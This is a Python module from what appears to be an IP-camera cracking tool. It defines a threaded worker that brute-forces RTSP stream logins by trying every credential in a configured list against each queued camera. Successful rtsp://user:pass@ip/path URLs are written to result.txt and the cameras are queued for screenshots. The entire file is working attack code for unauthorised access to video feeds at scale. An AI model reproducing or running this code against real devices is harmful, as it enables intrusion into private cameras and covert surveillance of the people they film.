import threading

import sys
sys.path.append('..')

import config
from .rtsp import RTSPClient


class BruteThread(threading.Thread):
    """
    Brutes given ip to gain access to the stream.
    """
    def __init__(self, brute_queue, screenshot_queue):
        threading.Thread.__init__(self)
        self.brute_queue = brute_queue
        self.screenshot_queue = screenshot_queue

    def add_to_results(self, creds, ip, path):
        with config.LOCK:
            with open('result.txt', 'a') as file:
                file.write(f'rtsp://{creds}@{ip}{path}\n')

    def brute(self, ip, path):
        with RTSPClient(ip, port=config.PORT, timeout=config.SOCKET_TIMEOUT) as client:
            for creds in config.CREDENTIALS:
                client.create_packet(path, creds)
                client.send_packet()
                if client.is_available() and client.is_authorized():
                    self.screenshot_queue.put((creds, ip, path))
                    config.update_bar(__class__)
                    self.add_to_results(creds, ip, path)
                    break

    def run(self):
        while True:
            ip, path = self.brute_queue.get()
            self.brute(ip, path)
            config.update_bar(__class__, main=True)
            self.brute_queue.task_done()
